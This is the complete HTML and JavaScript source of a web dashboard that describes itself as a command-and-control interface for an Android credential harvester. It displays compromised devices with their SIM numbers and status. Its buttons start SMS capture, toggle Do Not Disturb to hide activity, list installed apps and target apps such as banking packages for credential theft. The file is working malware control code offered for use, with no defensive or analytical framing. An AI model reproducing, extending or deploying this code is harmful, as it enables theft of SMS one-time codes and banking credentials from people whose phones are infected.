<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="30">
    <title>CryTake Dashboard</title>
    <meta name="description" content="Web-based C2 dashboard for Decry credential harvester">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: #1a1a1a;
            border-radius: 10px;
            border: 1px solid #333;
        }
        header h1 {
            color: #4CAF50;
            font-size: 2em;
            margin-bottom: 10px;
        }
        header .subtitle {
            color: #888;
            font-size: 0.9em;
        }
        .devices-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .device-card {
            background: #1a1a1a;
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #333;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .device-card:hover {
            border-color: #4CAF50;
            box-shadow: 0 0 15px rgba(76, 175, 80, 0.2);
        }
        .device-card.selected {
            border-color: #4CAF50;
            background: #1e1e1e;
        }
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .device-id {
            font-family: monospace;
            font-weight: bold;
            color: #4CAF50;
        }
        .device-status {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
        }
        .status-online {
            background: #2e7d32;
            color: white;
        }
        .status-offline {
            background: #c62828;
            color: white;
        }
        .device-info {
            margin-bottom: 15px;
        }
        .device-info div {
            margin: 5px 0;
            font-size: 0.9em;
        }
        .info-label {
            color: #888;
            margin-right: 8px;
        }
        .commands-section {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #333;
        }
        .commands-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #4CAF50;
        }
        .command-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        .command-btn {
            background: #333;
            color: #e0e0e0;
            border: 1px solid #555;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.85em;
            transition: all 0.2s;
        }
        .command-btn:hover {
            background: #444;
            border-color: #4CAF50;
            color: #4CAF50;
        }
        .command-btn:active {
            transform: scale(0.98);
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 12px 20px;
            border-radius: 5px;
            border: 1px solid #4CAF50;
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .toast.show {
            opacity: 1;
        }
        .no-devices {
            text-align: center;
            padding: 40px;
            color: #888;
        }
        .loading {
            text-align: center;
            padding: 40px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎯 CryTake Dashboard</h1>
            <div class="subtitle">Command & Control Interface for Decry Devices</div>
        </header>
        
        <div id="content">
            <div class="loading">Loading devices...</div>
        </div>
        
        <div id="toast" class="toast"></div>
    </div>

    <!-- Target/Untarget App Modal -->
<div id="target-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1001;">
    <div style="background:#1a1a1a; margin:10% auto; padding:20px; border-radius:10px; max-width:400px; border:1px solid #333;">
        <h3 style="color:#4CAF50; margin-bottom:15px;">🎯 Target App</h3>
        <input type="text" id="target-app-id" placeholder="Enter package name (e.g., com.bank.example)" style="width:100%; padding:10px; margin-bottom:15px; background:#2a2a2a; border:1px solid #555; border-radius:5px; color:#e0e0e0;">
        <div style="display:flex; gap:10px;">
            <button onclick="dashboard.targetApp()" style="flex:1; padding:10px; background:#333; border:1px solid #555; border-radius:5px; color:#e0e0e0; cursor:pointer;">Target</button>
            <button onclick="dashboard.closeTargetModal()" style="flex:1; padding:10px; background:#555; border:none; border-radius:5px; color:#e0e0e0; cursor:pointer;">Cancel</button>
        </div>
    </div>
</div>

<script>
        class CryptoDashboard {
            constructor() {
                this.devices = new Map();
                this.selectedDevice = null;
                this.targetDeviceId = null;
                this.init();
                this.loadDevices();
                setInterval(() => this.loadDevices(), 10000);
            }

            init() {
                document.getElementById('content').innerHTML = `
                    <div class="devices-container" id="devices-container">
                        <div class="loading">Loading devices...</div>
                    </div>
                `;
            }

            async loadDevices() {
                try {
                    const response = await fetch('/api/devices');
                    const devices = await response.json();
                    
                    this.devices.clear();
                    devices.forEach(device => {
                        this.devices.set(device.id, device);
                    });
                    
                    this.renderDevices();
                } catch (error) {
                    console.error('Failed to load devices:', error);
                    document.getElementById('devices-container').innerHTML = 
                        '<div class="no-devices">Failed to load devices. Retrying...</div>';
                }
            }

            renderDevices() {
                const container = document.getElementById('devices-container');
                
                if (this.devices.size === 0) {
                    container.innerHTML = '<div class="no-devices">No devices connected yet.</div>';
                    return;
                }
                
                let html = '';
                this.devices.forEach((device, id) => {
                    const isSelected = this.selectedDevice === id;
                    const statusClass = device.lastSeen && (Date.now() - new Date(device.lastSeen).getTime()) < 30000 
                        ? 'status-online' : 'status-offline';
                    
                    html += `
                        <div class="device-card ${isSelected ? 'selected' : ''}" onclick="dashboard.selectDevice('${id}')">
                            <div class="device-header">
                                <span class="device-id">${device.id || device.name}</span>
                                <span class="device-status ${statusClass}">${device.online ? 'ONLINE' : 'OFFLINE'}</span>
                            </div>
                            <div class="device-info">
                                <div><span class="info-label">Name:</span> ${device.name || 'Unknown'}</div>
                                <div><span class="info-label">Model:</span> ${device.model || 'Unknown'}</div>
                                <div><span class="info-label">Android:</span> ${device.androidVersion || 'Unknown'}</div>
                                <div><span class="info-label">SIM:</span> ${device.simNumbers || 'Not collected'}</div>
                                <div><span class="info-label">Last Seen:</span> ${device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : 'Never'}</div>
                                <div><span class="info-label">DND:</span> ${device.isDndOn ? '🔇 ON' : '🔊 OFF'}</div>
                                <div><span class="info-label">Monitor:</span> ${device.isMonitoring ? '✅ Active' : '❌ Inactive'}</div>
                            </div>
                            ${isSelected ? this.renderCommands(id) : ''}
                        </div>
                    `;
                });
                
                container.innerHTML = html;
            }

            renderCommands(deviceId) {
                            return `
                                <div class="commands-section">
                                    <div class="commands-title">Control Panel</div>
                                    <div class="command-grid">
                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'start_sms_capture', {})">📥 Receive SMS</button>
                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_sms_capture', {})">📋 Stop SMS</button>
                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_dnd', {enabled: true})">🔇 DND On</button>
                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'set_dnd', {enabled: false})">🔊 DND Off</button>
                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'get_installed_apps', {})">📱 All Apps</button>
                                        <button class="command-btn" onclick="dashboard.openTargetModal('${deviceId}')">🎯 Target App</button>
                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'list_targets', {})">📋 List Targets</button>
                                        <button class="command-btn" onclick="dashboard.sendCommand('${deviceId}', 'stop_monitoring', {})">⏹️ Stop Monitor</button>
                                    </div>
                                </div>
                            `;
            }

            selectDevice(deviceId) {
                this.selectedDevice = deviceId;
                this.renderDevices();
            }

            async sendCommand(deviceId, commandType, payload = {}) {
                try {
                    const response = await fetch('/api/command', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            deviceId,
                            commandType,
                            payload
                        })
                    });
                    
                    const result = await response.json();
                    this.showToast(`✅ Command sent: ${commandType}`);
                } catch (error) {
                    console.error('Failed to send command:', error);
                    this.showToast(`❌ Failed to send command: ${commandType}`);
                }
            }

            showToast(message) {
                const toast = document.getElementById('toast');
                toast.textContent = message;
                toast.classList.add('show');
                setTimeout(() => {
                    toast.classList.remove('show');
                }, 3000);
            }

            openTargetModal(deviceId) {
                this.targetDeviceId = deviceId;
                document.getElementById('target-modal').style.display = 'block';
                document.getElementById('target-app-id').value = '';
            }

            closeTargetModal() {
                document.getElementById('target-modal').style.display = 'none';
                this.targetDeviceId = null;
            }

            async targetApp() {
                const appId = document.getElementById('target-app-id').value.trim();
                if (!appId) {
                    this.showToast('❌ Please enter an app package name');
                    return;
                }
                
                // Send target_app command
                await this.sendCommand(this.targetDeviceId, 'target_app', { appId });
                this.showToast(`✅ App targeted: ${appId}`);
                this.closeTargetModal();
                
                // Also add to targets list
                await this.sendCommand(this.targetDeviceId, 'list_targets', {});
            }
        }

        const dashboard = new CryptoDashboard();
    </script>
</body>
</html>
